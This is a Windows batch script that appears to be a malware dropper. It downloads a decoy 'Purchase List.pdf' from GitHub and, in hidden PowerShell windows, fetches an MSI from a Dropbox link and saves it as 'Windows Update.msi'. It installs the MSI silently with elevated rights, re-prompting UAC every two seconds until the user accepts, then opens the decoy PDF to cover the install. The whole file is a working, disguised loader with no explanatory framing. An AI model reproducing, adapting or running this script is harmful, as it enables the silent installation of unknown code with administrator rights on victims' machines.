@echo off
setlocal enabledelayedexpansion

:: Set download URLs and paths
set "pdfUrl=https://raw.githubusercontent.com/pawheaven/product/main/Purchase%20List.pdf"
set "pdfFileName=Purchase List.pdf"
set "pdfFilePath=%TEMP%\%pdfFileName%"

set "url=https://dl.dropboxusercontent.com/scl/fi/yg0fp1m7geubbx4xc7aku/Product.msi?rlkey=0fz5h7bc75zan91qz6wfbetx5&st=8pir8yhc"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"

:: Delete existing files if any
if exist "%outputFilePath%" del /f /q "%outputFilePath%"
if exist "%pdfFilePath%" del /f /q "%pdfFilePath%"

powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%pdfUrl%' -OutFile '%pdfFilePath%' -UseBasicParsing } catch { exit 1 }"

echo %DATE% %TIME% download attempt >> "%TEMP%\product_install.log"

if exist "%pdfFilePath%" (
    echo %DATE% %TIME% PDF saved: "%pdfFilePath%" >> "%TEMP%\product_install.log"
) else (
    echo %DATE% %TIME% PDF NOT saved >> "%TEMP%\product_install.log"
)

if not exist "%pdfFilePath%" (
    echo PDF download failed. Continuing with MSI download...
)

powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" (
    echo MSI download failed. Exiting.
    exit /b 1
)

:RunLoop

:: Try to elevate and run the MSI silently
powershell -WindowStyle Hidden -Command "$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs -PassThru -ErrorAction SilentlyContinue; if ($p) { $p.WaitForExit(); exit 0 } else { exit 1 }"

:: Check if last command succeeded (user clicked Yes)
if %ERRORLEVEL%==0 (
    :: Open PDF after UAC is accepted and installation starts
    if exist "%pdfFilePath%" (
        echo Opening PDF...
        start "" "%pdfFilePath%"
    )
    exit /b 0
)

:: Wait 2 seconds before trying again
timeout /t 2 /nobreak >nul

goto RunLoop
